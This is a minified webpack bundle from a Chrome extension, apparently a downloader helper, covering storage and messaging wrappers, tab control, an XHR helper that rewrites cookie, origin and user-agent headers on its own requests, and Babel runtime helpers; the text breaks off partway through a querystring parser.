!function(e){var t={};function r(n){if(t[n])return t[n].exports;var o=t[n]={i:n,l:!1,exports:{}};return e[n].call(o.exports,o,o.exports,r),o.l=!0,o.exports}r.m=e,r.c=t,r.d=function(e,t,n){r.o(e,t)||Object.defineProperty(e,t,{enumerable:!0,get:n})},r.r=function(e){"undefined"!=typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(e,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(e,"__esModule",{value:!0})},r.t=function(e,t){if(1&t&&(e=r(e)),8&t)return e;if(4&t&&"object"==typeof e&&e&&e.__esModule)return e;var n=Object.create(null);if(r.r(n),Object.defineProperty(n,"default",{enumerable:!0,value:e}),2&t&&"string"!=typeof e)for(var o in e)r.d(n,o,function(t){return e[t]}.bind(null,o));return n},r.n=function(e){var t=e&&e.__esModule?function(){return e.default}:function(){return e};return r.d(t,"a",t),t},r.o=function(e,t){return Object.prototype.hasOwnProperty.call(e,t)},r.p="",r(r.s=41)}([function(e,t,r){"use strict";var n=r(1),o=r(7),i=r(8),a=r(6),s=r(2),u=r(22);function c(e,t,r){return(c="undefined"!=typeof Reflect&&Reflect.get?Reflect.get:function(e,t,r){var n=u(e,t);if(n){var o=Object.getOwnPropertyDescriptor(n,t);return o.get?o.get.call(r):o.value}})(e,t,r||e)}var l=function(){function e(t){Object(n.a)(this,e),this.mono=t,this.onChanged={addListener:function(e){chrome.storage.onChanged.addListener(e)},hasListener:function(e){return chrome.storage.onChanged.hasListener(e)},hasListeners:function(){return chrome.storage.onChanged.hasListeners()},removeListener:function(e){chrome.storage.onChanged.removeListener(e)}}}return Object(s.a)(e,[{key:"callback",value:function(e,t,r){this.mono.lastError=chrome.runtime.lastError,(r||e)&&e(t),this.mono.clearLastError()}},{key:"get",value:function(e,t){var r=this;chrome.storage.local.get(e,function(e){return r.callback(t,e,!0)})}},{key:"set",value:function(e,t){var r=this;chrome.storage.local.set(e,function(){return r.callback(t)})}},{key:"remove",value:function(e,t){var r=this;chrome.storage.local.remove(e,function(){return r.callback(t)})}},{key:"clear",value:function(e){var t=this;chrome.storage.local.clear(function(){return t.callback(e)})}}]),e}();var f=function(){function e(){Object(n.a)(this,e),this.listeners=[]}return Object(s.a)(e,[{key:"addListener",value:function(e){-1===this.listeners.indexOf(e)&&this.listeners.push(e)}},{key:"dispatch",value:function(){for(var e=arguments.length,t=new Array(e),r=0;r<e;r++)t[r]=arguments[r];this.listeners.forEach(function(e){e.apply(void 0,t)})}},{key:"hasListener",value:function(e){return-1!==this.listeners.indexOf(e)}},{key:"hasListeners",value:function(){return this.listeners.length>0}},{key:"removeListener",value:function(e){var t=this.listeners.indexOf(e);-1!==t&&this.listeners.splice(t,1)}}]),e}(),d=r(5),h=Object(d.a)("mono"),p=function(){function e(){Object(n.a)(this,e),this.onDestroy=new f,this._lastErrorFired=!1,this._lastError=null}return Object(s.a)(e,[{key:"lastError",get:function(){return this._lastErrorFired=!0,this._lastError},set:function(e){this._lastErrorFired=!e,this._lastError=e}},{key:"clearLastError",value:function(){this._lastError&&!this._lastErrorFired&&h.error("Unhandled mono.lastError error:",this.lastError),this._lastError=null}},{key:"unimplemented",value:function(){throw new Error("Unimplemented")}},{key:"destroy",value:function(){this.onDestroy.dispatch()}}]),e}();function m(e){if(void 0===e)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return e}var v=r(29),y=Object(d.a)("mono:callFnListener");var g=function(e){return function(e){Object(o.a)(r,e);var t=function(e){var t=function(){if("undefined"==typeof Reflect||!Reflect.construct)return!1;if(Reflect.construct.sham)return!1;if("function"==typeof Proxy)return!0;try{return Boolean.prototype.valueOf.call(Reflect.construct(Boolean,[],function(){})),!0}catch(e){return!1}}();return function(){var r,n=Object(a.a)(e);if(t){var o=Object(a.a)(this).constructor;r=Reflect.construct(n,arguments,o)}else r=n.apply(this,arguments);return Object(i.a)(this,r)}}(r);function r(){return Object(n.a)(this,r),t.apply(this,arguments)}return r}(e)};var b=function(e){Object(o.a)(r,e);var t=function(e){var t=function(){if("undefined"==typeof Reflect||!Reflect.construct)return!1;if(Reflect.construct.sham)return!1;if("function"==typeof Proxy)return!0;try{return Boolean.prototype.valueOf.call(Reflect.construct(Boolean,[],function(){})),!0}catch(e){return!1}}();return function(){var r,n=Object(a.a)(e);if(t){var o=Object(a.a)(this).constructor;r=Reflect.construct(n,arguments,o)}else r=n.apply(this,arguments);return Object(i.a)(this,r)}}(r);function r(){return Object(n.a)(this,r),t.apply(this,arguments)}return r}(function(e){return function(e){Object(o.a)(r,e);var t=function(e){var t=function(){if("undefined"==typeof Reflect||!Reflect.construct)return!1;if(Reflect.construct.sham)return!1;if("function"==typeof Proxy)return!0;try{return Boolean.prototype.valueOf.call(Reflect.construct(Boolean,[],function(){})),!0}catch(e){return!1}}();return function(){var r,n=Object(a.a)(e);if(t){var o=Object(a.a)(this).constructor;r=Reflect.construct(n,arguments,o)}else r=n.apply(this,arguments);return Object(i.a)(this,r)}}(r);function r(){return Object(n.a)(this,r),t.apply(this,arguments)}return Object(s.a)(r,[{key:"openTab",value:function(e,t){this.unimplemented()}}]),r}(g(e))}(function(e){Object(o.a)(r,e);var t=function(e){var t=function(){if("undefined"==typeof Reflect||!Reflect.construct)return!1;if(Reflect.construct.sham)return!1;if("function"==typeof Proxy)return!0;try{return Boolean.prototype.valueOf.call(Reflect.construct(Boolean,[],function(){})),!0}catch(e){return!1}}();return function(){var r,n=Object(a.a)(e);if(t){var o=Object(a.a)(this).constructor;r=Reflect.construct(n,arguments,o)}else r=n.apply(this,arguments);return Object(i.a)(this,r)}}(r);function r(){var e;return Object(n.a)(this,r),(e=t.call(this)).remote={mono:m(e)},e.callFnListener=e.callFnListener.bind(m(e)),e}return Object(s.a)(r,[{key:"initMessages",value:function(){c(Object(a.a)(r.prototype),"initMessages",this).call(this),this.onMessage.addListener(this.callFnListener)}},{key:"responseFn",value:function(e,t){var r=this,n=Promise.resolve().then(function(){var t=function(e,t){for(var r=t.split("."),n=r.pop();r.length;)e=e[r.shift()];return{scope:e,endPoint:n}}(r.remote,e.fn),n=t.scope,o=t.endPoint,i=e.args||[];return n[o].apply(n,i)});return this.responsePromise(n,t)}},{key:"responsePromise",value:function(e,t){return e.then(function(e){t({result:e})},function(e){t({err:v(e)})}).catch(function(e){y.error("responsePromise error",e)}),!0}},{key:"callFnListener",value:function(e,t,r){switch(e&&e.action){case"callFn":return this.responseFn(e,r),!0}}},{key:"destroy",value:function(){this.onMessage.removeListener(this.callFnListener),c(Object(a.a)(r.prototype),"destroy",this).call(this)}}]),r}(function(e){return function(e){Object(o.a)(r,e);var t=function(e){var t=function(){if("undefined"==typeof Reflect||!Reflect.construct)return!1;if(Reflect.construct.sham)return!1;if("function"==typeof Proxy)return!0;try{return Boolean.prototype.valueOf.call(Reflect.construct(Boolean,[],function(){})),!0}catch(e){return!1}}();return function(){var r,n=Object(a.a)(e);if(t){var o=Object(a.a)(this).constructor;r=Reflect.construct(n,arguments,o)}else r=n.apply(this,arguments);return Object(i.a)(this,r)}}(r);function r(){return Object(n.a)(this,r),t.apply(this,arguments)}return Object(s.a)(r,[{key:"initMessages",value:function(){this.sendMessage=this.transport.sendMessage.bind(this.transport),this.sendMessageToActiveTab=this.transport.sendMessageToActiveTab.bind(this.transport),this.onMessage={addListener:this.transport.addListener.bind(this.transport),hasListener:this.transport.hasListener.bind(this.transport),hasListeners:this.transport.hasListeners.bind(this.transport),removeListener:this.transport.removeListener.bind(this.transport)}}}]),r}(e)}(p))));var w=function(e){return function(e){Object(o.a)(r,e);var t=function(e){var t=function(){if("undefined"==typeof Reflect||!Reflect.construct)return!1;if(Reflect.construct.sham)return!1;if("function"==typeof Proxy)return!0;try{return Boolean.prototype.valueOf.call(Reflect.construct(Boolean,[],function(){})),!0}catch(e){return!1}}();return function(){var r,n=Object(a.a)(e);if(t){var o=Object(a.a)(this).constructor;r=Reflect.construct(n,arguments,o)}else r=n.apply(this,arguments);return Object(i.a)(this,r)}}(r);function r(){var e;return Object(n.a)(this,r),(e=t.call(this)).isChrome=!0,e}return Object(s.a)(r,[{key:"isChromeMobile",get:function(){return/Mobile Safari\/(\d+)|Android (\d+)/.test(navigator.userAgent)}},{key:"isOperaNext",get:function(){return/OPR\/(\d+)/.test(navigator.userAgent)}}]),r}(e)};var x=new(function(e){Object(o.a)(r,e);var t=function(e){var t=function(){if("undefined"==typeof Reflect||!Reflect.construct)return!1;if(Reflect.construct.sham)return!1;if("function"==typeof Proxy)return!0;try{return Boolean.prototype.valueOf.call(Reflect.construct(Boolean,[],function(){})),!0}catch(e){return!1}}();return function(){var r,n=Object(a.a)(e);if(t){var o=Object(a.a)(this).constructor;r=Reflect.construct(n,arguments,o)}else r=n.apply(this,arguments);return Object(i.a)(this,r)}}(r);function r(){var e;return Object(n.a)(this,r),(e=t.call(this)).initMessages(),e.initStorage(),e.initI18n(),e}return r}(function(e){return function(e){Object(o.a)(r,e);var t=function(e){var t=function(){if("undefined"==typeof Reflect||!Reflect.construct)return!1;if(Reflect.construct.sham)return!1;if("function"==typeof Proxy)return!0;try{return Boolean.prototype.valueOf.call(Reflect.construct(Boolean,[],function(){})),!0}catch(e){return!1}}();return function(){var r,n=Object(a.a)(e);if(t){var o=Object(a.a)(this).constructor;r=Reflect.construct(n,arguments,o)}else r=n.apply(this,arguments);return Object(i.a)(this,r)}}(r);function r(){return Object(n.a)(this,r),t.apply(this,arguments)}return Object(s.a)(r,[{key:"openTab",value:function(e,t){t=void 0===t||!!t,chrome.tabs.create({url:e,active:t})}},{key:"executeScript",value:function(e,t){chrome.tabs.executeScript(e.id,t)}},{key:"getActiveTab",value:function(e){chrome.tabs.query({active:!0,currentWindow:!0},function(t){return e(t[0])})}}]),r}(w(e))}(function(e){return function(e){Object(o.a)(r,e);var t=function(e){var t=function(){if("undefined"==typeof Reflect||!Reflect.construct)return!1;if(Reflect.construct.sham)return!1;if("function"==typeof Proxy)return!0;try{return Boolean.prototype.valueOf.call(Reflect.construct(Boolean,[],function(){})),!0}catch(e){return!1}}();return function(){var r,n=Object(a.a)(e);if(t){var o=Object(a.a)(this).constructor;r=Reflect.construct(n,arguments,o)}else r=n.apply(this,arguments);return Object(i.a)(this,r)}}(r);function r(){return Object(n.a)(this,r),t.apply(this,arguments)}return Object(s.a)(r,[{key:"initI18n",value:function(){this.i18n={getMessage:chrome.i18n.getMessage.bind(chrome.i18n)}}},{key:"initMessages",value:function(){var e=this;this.transport={sendMessage:function(t,r){r?chrome.runtime.sendMessage(t,function(t){e.lastError=chrome.runtime.lastError,r(t),e.clearLastError()}):chrome.runtime.sendMessage(t)},sendMessageToActiveTab:function(t,r){chrome.tabs.query({active:!0,currentWindow:!0},function(n){var o=n[0];o&&o.id>=0?r?chrome.tabs.sendMessage(o.id,t,function(t){e.lastError=chrome.runtime.lastError,r(t),e.clearLastError()}):chrome.tabs.sendMessage(o.id,t):(e.lastError=new Error("Active tab is not found"),r&&r(),e.clearLastError())})},addListener:function(e){chrome.runtime.onMessage.addListener(e)},hasListener:function(e){return chrome.runtime.onMessage.hasListener(e)},hasListeners:function(){return chrome.runtime.onMessage.hasListeners()},removeListener:function(e){chrome.runtime.onMessage.removeListener(e)}},c(Object(a.a)(r.prototype),"initMessages",this).call(this)}},{key:"initStorage",value:function(){this.storage=new l(this)}}]),r}(e)}(b))));t.a=x},function(e,t,r){"use strict";function n(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}r.d(t,"a",function(){return n})},function(e,t,r){"use strict";function n(e,t){for(var r=0;r<t.length;r++){var n=t[r];n.enumerable=n.enumerable||!1,n.configurable=!0,"value"in n&&(n.writable=!0),Object.defineProperty(e,n.key,n)}}function o(e,t,r){return t&&n(e.prototype,t),r&&n(e,r),e}r.d(t,"a",function(){return o})},function(e,t,r){e.exports=r(28)},function(e,t,r){"use strict";var n,o,i,a,s,u,c,l,f,d,h,p,m,v,y,g=r(5),b=Object(g.a)("webRequest"),w=(n=/^sf-\d+_/,o={urls:["<all_urls>"],types:["xmlhttprequest"]},i=!1,a={},s={},u=function(e){for(var t in e)return!1;return!0},c=function(e){delete s[e.requestId],u(a)&&u(s)&&d()},l=function(e){var t=s[e.requestId],r=e.requestHeaders||[],o=[],i=[],c=[];if(t)i=t.changes,o=t.filtered;else if(!u(a))for(var l,f,d,h=0;d=r[h];h++)l=d.name,n.test(l)&&(f=a[l])&&(d.name=f.name,d.value=f.value,i.push(d),o.push(f.name.toLowerCase()),o.push(l.toLowerCase()),/cookie/i.test(d.name)&&c.push("set-cookie"),clearTimeout(f.timer),delete a[l]);if(i.length)return t||(s[e.requestId]={changes:i,filtered:o,filterResponseHeaders:c}),{requestHeaders:r.filter(function(e){return-1===o.indexOf(e.name.toLowerCase())}).concat(i)}},f=function(e){var t=s[e.requestId],r=e.responseHeaders;if(t&&r){var n=t.filterResponseHeaders;return{responseHeaders:r.filter(function(e){return-1===n.indexOf(e.name.toLowerCase())})}}},d=function(){i&&(i=!1,chrome.webRequest.onBeforeSendHeaders.removeListener(l,o,["blocking","requestHeaders"]),chrome.webRequest.onHeadersReceived.removeListener(f,o,["blocking","responseHeaders"]),chrome.webRequest.onResponseStarted.removeListener(c,o),chrome.webRequest.onErrorOccurred.removeListener(c,o),b.debug("webRequest","rm listener"))},h=10,p=!1,m=null,v=function(e){return(null===m||e)&&(m=!!(chrome.webRequest&&chrome.webRequest.onBeforeSendHeaders&&chrome.webRequest.onResponseStarted&&chrome.webRequest.onErrorOccurred)),m},y=/^user-agent$|^origin$|^cookie$/i,{wrapHeaderKey:function(e,t){if(v()){for(var r,n=100;n-- >0&&(r="sf-"+parseInt(1e5*Math.random())+"_"+e,a[r]););return a[r]={name:e,value:t,timer:setTimeout(function(){delete a[r]},3e3)},i||(i=!0,chrome.webRequest.onBeforeSendHeaders.addListener(l,o,["blocking","requestHeaders"]),chrome.webRequest.onHeadersReceived.addListener(f,o,["blocking","responseHeaders"]),chrome.webRequest.onResponseStarted.addListener(c,o),chrome.webRequest.onErrorOccurred.addListener(c,o),b.debug("webRequest","add listener")),r}return e},isSpecialHeader:function(e){return y.test(e)},requestPermission:function(e){v()||p?e(m):chrome.permissions&&chrome.permissions.request?chrome.permissions.request({permissions:["webRequest","webRequestBlocking"]},function(t){(t||h--<=0)&&(p=!0),t&&v(!0),e(m)}):(p=!0,e(m))}}),x=r(9);t.a=function(e,t){var r={},n=function(e,r){n=null,u.timeoutTimer&&clearTimeout(u.timeoutTimer);var i=null;e&&(i=String(e.message||e)||"ERROR"),t&&t(i,o(r),r)},o=function(e){var t={};t.statusCode=l.status,t.statusText=l.statusText;var r=null,n=l.getAllResponseHeaders();return"string"==typeof n&&(r=function(e){e=e.split(/\r?\n/);var t={};return e.forEach(function(e){var r=e.indexOf(":");if(-1!==r){var n=e.substr(0,r).trim().toLowerCase(),o=e.substr(r+1).trim();t[n]=o}}),t}(n)),t.headers=r||{},t.body=e,t.responseURL=l.responseURL,t};"object"!=typeof e&&(e={url:e});var i=e.url,a=e.method||e.type||"GET";a=a.toUpperCase();var s=e.data;"string"!=typeof s&&(s=x.stringify(s)),s&&"GET"===a&&(i+=(/\?/.test(i)?"&":"?")+s,s=void 0),!1===e.cache&&-1!==["GET","HEAD"].indexOf(a)&&(i+=(/\?/.test(i)?"&":"?")+"_="+Date.now()),e.headers=e.headers||{},s&&(e.headers["Content-Type"]=e.contentType||e.headers["Content-Type"]||"application/x-www-form-urlencoded; charset=UTF-8");var u={};u.url=i,u.method=a,s&&(u.data=s),e.json&&(u.json=!0),e.xml&&(u.xml=!0),e.timeout&&(u.timeout=e.timeout),e.mimeType&&(u.mimeType=e.mimeType),e.withCredentials&&(u.withCredentials=!0),Object.keys(e.headers).length&&(u.headers=e.headers),u.timeout>0&&(u.timeoutTimer=setTimeout(function(){n&&n(new Error("ETIMEDOUT")),l.abort()},u.timeout));var c={0:200,1223:204},l=(e.localXHR,new XMLHttpRequest);l.open(u.method,u.url,!0),u.mimeType&&l.overrideMimeType(u.mimeType),u.withCredentials&&(l.withCredentials=!0);var f=[];for(var d in u.headers)w&&w.isSpecialHeader(d)&&f.push({key:d,value:u.headers[d]}),l.setRequestHeader(d,u.headers[d]);l.onload=function(){var e=c[l.status]||l.status;try{if(e>=200&&e<300||304===e){var t=l.responseText;if(u.json)t=JSON.parse(t);else if(u.xml)t=(new DOMParser).parseFromString(t,"text/xml");else if("string"!=typeof t)throw console.error("Response is not string!",t),new Error("Response is not string!");return n&&n(null,t)}throw new Error(l.status+" "+l.statusText)}catch(e){return n&&n(e)}};var h=l.onerror=function(){n&&n(new Error(l.status+" "+l.statusText))},p=null;void 0!==l.onabort?l.onabort=h:p=function(){4===l.readyState&&n&&setTimeout(function(){return h()})},p&&(l.onreadystatechange=p);var m=function(){try{l.send(u.data||null)}catch(e){setTimeout(function(){n&&n(e)})}};return w&&f.length?w.requestPermission(function(e){e&&function(){for(var e,t=0;e=f[t];t++)l.setRequestHeader(w.wrapHeaderKey(e.key,e.value),e.value)}(),n&&m()}):m(),r.abort=function(){n=null,l.abort()},r}},function(e,t,r){"use strict";t.a=function(e){var t=null;return(t=function(){}).t=t.log=t.info=t.warn=t.error=t.debug=t,t}},function(e,t,r){"use strict";function n(e){return(n=Object.setPrototypeOf?Object.getPrototypeOf:function(e){return e.__proto__||Object.getPrototypeOf(e)})(e)}r.d(t,"a",function(){return n})},function(e,t,r){"use strict";r.d(t,"a",function(){return o});var n=r(11);function o(e,t){if("function"!=typeof t&&null!==t)throw new TypeError("Super expression must either be null or a function");e.prototype=Object.create(t&&t.prototype,{constructor:{value:e,writable:!0,configurable:!0}}),t&&n(e,t)}},function(e,t,r){"use strict";r.d(t,"a",function(){return i});var n=r(20),o=r(21);function i(e,t){return!t||"object"!==n(t)&&"function"!=typeof t?o(e):t}},function(e,t,r){"use strict";t.decode=t.parse=r(30),t.encode=t.stringify=r(31)},function(e,t,r){"use strict";var n=r(0);t.a=function(e){return new Promise(function(t){return n.a.storage.get(e,t)})}},function(e,t){function r(t,n){return e.exports=r=Object.setPrototypeOf||function(e,t){return e.__proto__=t,e},e.exports.default=e.exports,e.exports.__esModule=!0,r(t,n)}e.exports=r,e.exports.default=e.exports,e.exports.__esModule=!0},function(e,t,r){var n=r(16);e.exports=function(e,t){if(e){if("string"==typeof e)return n(e,t);var r=Object.prototype.toString.call(e).slice(8,-1);return"Object"===r&&e.constructor&&(r=e.constructor.name),"Map"===r||"Set"===r?Array.from(e):"Arguments"===r||/^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(r)?n(e,t):void 0}},e.exports.default=e.exports,e.exports.__esModule=!0},function(e,t,r){"use strict";t.a=function(e){return function(t){return e.some(function(e){return function(e,t){var r=e.matches.test(t);return r&&e.exclude_matches&&(r=!e.exclude_matches.test(t)),r&&e.include_globs&&(r=e.include_globs.test(t)),r&&e.exclude_globs&&(r=!e.exclude_globs.test(t)),r}(e,t)})}}},function(e,t,r){"use strict";var n=r(0);t.a=function(e){return new Promise(function(t){return n.a.storage.set(e,t)})}},function(e,t){function r(t){return e.exports=r=Object.setPrototypeOf?Object.getPrototypeOf:function(e){return e.__proto__||Object.getPrototypeOf(e)},e.exports.default=e.exports,e.exports.__esModule=!0,r(t)}e.exports=r,e.exports.default=e.exports,e.exports.__esModule=!0},function(e,t){e.exports=function(e,t){(null==t||t>e.length)&&(t=e.length);for(var r=0,n=new Array(t);r<t;r++)n[r]=e[r];return n},e.exports.default=e.exports,e.exports.__esModule=!0},function(e,t,r){var n=r(16);e.exports=function(e){if(Array.isArray(e))return n(e)},e.exports.default=e.exports,e.exports.__esModule=!0},function(e,t){e.exports=function(e){if("undefined"!=typeof Symbol&&Symbol.iterator in Object(e))return Array.from(e)},e.exports.default=e.exports,e.exports.__esModule=!0},function(e,t){e.exports=function(){throw new TypeError("Invalid attempt to spread non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")},e.exports.default=e.exports,e.exports.__esModule=!0},function(e,t){function r(t){return"function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?(e.exports=r=function(e){return typeof e},e.exports.default=e.exports,e.exports.__esModule=!0):(e.exports=r=function(e){return e&&"function"==typeof Symbol&&e.constructor===Symbol&&e!==Symbol.prototype?"symbol":typeof e},e.exports.default=e.exports,e.exports.__esModule=!0),r(t)}e.exports=r,e.exports.default=e.exports,e.exports.__esModule=!0},function(e,t){e.exports=function(e){if(void 0===e)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return e},e.exports.default=e.exports,e.exports.__esModule=!0},function(e,t,r){var n=r(15);e.exports=function(e,t){for(;!Object.prototype.hasOwnProperty.call(e,t)&&null!==(e=n(e)););return e},e.exports.default=e.exports,e.exports.__esModule=!0},function(e,t){e.exports=function(e){return-1!==Function.toString.call(e).indexOf("[native code]")},e.exports.default=e.exports,e.exports.__esModule=!0},function(e,t,r){var n=r(11),o=r(32);function i(t,r,a){return o()?(e.exports=i=Reflect.construct,e.exports.default=e.exports,e.exports.__esModule=!0):(e.exports=i=function(e,t,r){var o=[null];o.push.apply(o,t);var i=new(Function.bind.apply(e,o));return r&&n(i,r.prototype),i},e.exports.default=e.exports,e.exports.__esModule=!0),i.apply(null,arguments)}e.exports=i,e.exports.default=e.exports,e.exports.__esModule=!0},function(e,t){e.exports=function(e){if(Array.isArray(e))return e},e.exports.default=e.exports,e.exports.__esModule=!0},function(e,t){e.exports=function(e,t){if("undefined"!=typeof Symbol&&Symbol.iterator in Object(e)){var r=[],n=!0,o=!1,i=void 0;try{for(var a,s=e[Symbol.iterator]();!(n=(a=s.next()).done)&&(r.push(a.value),!t||r.length!==t);n=!0);}catch(e){o=!0,i=e}finally{try{n||null==s.return||s.return()}finally{if(o)throw i}}return r}},e.exports.default=e.exports,e.exports.__esModule=!0},function(e,t){e.exports=function(){throw new TypeError("Invalid attempt to destructure non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")},e.exports.default=e.exports,e.exports.__esModule=!0},function(e,t,r){var n=function(e){"use strict";var t=Object.prototype,r=t.hasOwnProperty,n="function"==typeof Symbol?Symbol:{},o=n.iterator||"@@iterator",i=n.asyncIterator||"@@asyncIterator",a=n.toStringTag||"@@toStringTag";function s(e,t,r){return Object.defineProperty(e,t,{value:r,enumerable:!0,configurable:!0,writable:!0}),e[t]}try{s({},"")}catch(e){s=function(e,t,r){return e[t]=r}}function u(e,t,r,n){var o=t&&t.prototype instanceof f?t:f,i=Object.create(o.prototype),a=new O(n||[]);return i._invoke=function(e,t,r){var n="suspendedStart";return function(o,i){if("executing"===n)throw new Error("Generator is already running");if("completed"===n){if("throw"===o)throw i;return{value:void 0,done:!0}}for(r.method=o,r.arg=i;;){var a=r.delegate;if(a){var s=w(a,r);if(s){if(s===l)continue;return s}}if("next"===r.method)r.sent=r._sent=r.arg;else if("throw"===r.method){if("suspendedStart"===n)throw n="completed",r.arg;r.dispatchException(r.arg)}else"return"===r.method&&r.abrupt("return",r.arg);n="executing";var u=c(e,t,r);if("normal"===u.type){if(n=r.done?"completed":"suspendedYield",u.arg===l)continue;return{value:u.arg,done:r.done}}"throw"===u.type&&(n="completed",r.method="throw",r.arg=u.arg)}}}(e,r,a),i}function c(e,t,r){try{return{type:"normal",arg:e.call(t,r)}}catch(e){return{type:"throw",arg:e}}}e.wrap=u;var l={};function f(){}function d(){}function h(){}var p={};p[o]=function(){return this};var m=Object.getPrototypeOf,v=m&&m(m(j([])));v&&v!==t&&r.call(v,o)&&(p=v);var y=h.prototype=f.prototype=Object.create(p);function g(e){["next","throw","return"].forEach(function(t){s(e,t,function(e){return this._invoke(t,e)})})}function b(e,t){var n;this._invoke=function(o,i){function a(){return new t(function(n,a){!function n(o,i,a,s){var u=c(e[o],e,i);if("throw"!==u.type){var l=u.arg,f=l.value;return f&&"object"==typeof f&&r.call(f,"__await")?t.resolve(f.__await).then(function(e){n("next",e,a,s)},function(e){n("throw",e,a,s)}):t.resolve(f).then(function(e){l.value=e,a(l)},function(e){return n("throw",e,a,s)})}s(u.arg)}(o,i,n,a)})}return n=n?n.then(a,a):a()}}function w(e,t){var r=e.iterator[t.method];if(void 0===r){if(t.delegate=null,"throw"===t.method){if(e.iterator.return&&(t.method="return",t.arg=void 0,w(e,t),"throw"===t.method))return l;t.method="throw",t.arg=new TypeError("The iterator does not provide a 'throw' method")}return l}var n=c(r,e.iterator,t.arg);if("throw"===n.type)return t.method="throw",t.arg=n.arg,t.delegate=null,l;var o=n.arg;return o?o.done?(t[e.resultName]=o.value,t.next=e.nextLoc,"return"!==t.method&&(t.method="next",t.arg=void 0),t.delegate=null,l):o:(t.method="throw",t.arg=new TypeError("iterator result is not an object"),t.delegate=null,l)}function x(e){var t={tryLoc:e[0]};1 in e&&(t.catchLoc=e[1]),2 in e&&(t.finallyLoc=e[2],t.afterLoc=e[3]),this.tryEntries.push(t)}function k(e){var t=e.completion||{};t.type="normal",delete t.arg,e.completion=t}function O(e){this.tryEntries=[{tryLoc:"root"}],e.forEach(x,this),this.reset(!0)}function j(e){if(e){var t=e[o];if(t)return t.call(e);if("function"==typeof e.next)return e;if(!isNaN(e.length)){var n=-1,i=function t(){for(;++n<e.length;)if(r.call(e,n))return t.value=e[n],t.done=!1,t;return t.value=void 0,t.done=!0,t};return i.next=i}}return{next:L}}function L(){return{value:void 0,done:!0}}return d.prototype=y.constructor=h,h.constructor=d,d.displayName=s(h,a,"GeneratorFunction"),e.isGeneratorFunction=function(e){var t="function"==typeof e&&e.constructor;return!!t&&(t===d||"GeneratorFunction"===(t.displayName||t.name))},e.mark=function(e){return Object.setPrototypeOf?Object.setPrototypeOf(e,h):(e.__proto__=h,s(e,a,"GeneratorFunction")),e.prototype=Object.create(y),e},e.awrap=function(e){return{__await:e}},g(b.prototype),b.prototype[i]=function(){return this},e.AsyncIterator=b,e.async=function(t,r,n,o,i){void 0===i&&(i=Promise);var a=new b(u(t,r,n,o),i);return e.isGeneratorFunction(r)?a:a.next().then(function(e){return e.done?e.value:a.next()})},g(y),s(y,a,"Generator"),y[o]=function(){return this},y.toString=function(){return"[object Generator]"},e.keys=function(e){var t=[];for(var r in e)t.push(r);return t.reverse(),function r(){for(;t.length;){var n=t.pop();if(n in e)return r.value=n,r.done=!1,r}return r.done=!0,r}},e.values=j,O.prototype={constructor:O,reset:function(e){if(this.prev=0,this.next=0,this.sent=this._sent=void 0,this.done=!1,this.delegate=null,this.method="next",this.arg=void 0,this.tryEntries.forEach(k),!e)for(var t in this)"t"===t.charAt(0)&&r.call(this,t)&&!isNaN(+t.slice(1))&&(this[t]=void 0)},stop:function(){this.done=!0;var e=this.tryEntries[0].completion;if("throw"===e.type)throw e.arg;return this.rval},dispatchException:function(e){if(this.done)throw e;var t=this;function n(r,n){return a.type="throw",a.arg=e,t.next=r,n&&(t.method="next",t.arg=void 0),!!n}for(var o=this.tryEntries.length-1;o>=0;--o){var i=this.tryEntries[o],a=i.completion;if("root"===i.tryLoc)return n("end");if(i.tryLoc<=this.prev){var s=r.call(i,"catchLoc"),u=r.call(i,"finallyLoc");if(s&&u){if(this.prev<i.catchLoc)return n(i.catchLoc,!0);if(this.prev<i.finallyLoc)return n(i.finallyLoc)}else if(s){if(this.prev<i.catchLoc)return n(i.catchLoc,!0)}else{if(!u)throw new Error("try statement without catch or finally");if(this.prev<i.finallyLoc)return n(i.finallyLoc)}}}},abrupt:function(e,t){for(var n=this.tryEntries.length-1;n>=0;--n){var o=this.tryEntries[n];if(o.tryLoc<=this.prev&&r.call(o,"finallyLoc")&&this.prev<o.finallyLoc){var i=o;break}}i&&("break"===e||"continue"===e)&&i.tryLoc<=t&&t<=i.finallyLoc&&(i=null);var a=i?i.completion:{};return a.type=e,a.arg=t,i?(this.method="next",this.next=i.finallyLoc,l):this.complete(a)},complete:function(e,t){if("throw"===e.type)throw e.arg;return"break"===e.type||"continue"===e.type?this.next=e.arg:"return"===e.type?(this.rval=this.arg=e.arg,this.method="return",this.next="end"):"normal"===e.type&&t&&(this.next=t),l},finish:function(e){for(var t=this.tryEntries.length-1;t>=0;--t){var r=this.tryEntries[t];if(r.finallyLoc===e)return this.complete(r.completion,r.afterLoc),k(r),l}},catch:function(e){for(var t=this.tryEntries.length-1;t>=0;--t){var r=this.tryEntries[t];if(r.tryLoc===e){var n=r.completion;if("throw"===n.type){var o=n.arg;k(r)}return o}}throw new Error("illegal catch attempt")},delegateYield:function(e,t,r){return this.delegate={iterator:j(e),resultName:t,nextLoc:r},"next"===this.method&&(this.arg=void 0),l}},e}(e.exports);try{regeneratorRuntime=n}catch(e){Function("r","regeneratorRuntime = r")(n)}},function(e,t,r){"use strict";e.exports=function(e){return"object"==typeof e?function e(t,r){var n;return n=Array.isArray(t)?[]:{},r.push(t),Object.keys(t).forEach(function(o){var i=t[o];"function"!=typeof i&&(i&&"object"==typeof i?-1!==r.indexOf(t[o])?n[o]="[Circular]":n[o]=e(t[o],r.slice(0)):n[o]=i)}),"string"==typeof t.name&&(n.name=t.name),"string"==typeof t.message&&(n.message=t.message),"string"==typeof t.stack&&(n.stack=t.stack),n}(e,[]):"function"==typeof e?"[Function: "+(e.name||"anonymous")+"]":e}},function(e,t,r){"use strict";function n(e,t){return Object.prototype.hasOwnProperty.call(e,t)}e.exports=function(e,t,r,i){t=t||"&",r=r||"=";var a={};if("string"!=typeof e||0===e.length)return a;var s=/\+/g;e=e.split(t);var u=1e3;i&&"number"==typeof i.maxKeys&&(u=i.maxKeys);var c=e.length;u>0&&c>u&&(c=u);for(var l=0;l<c;++l){var 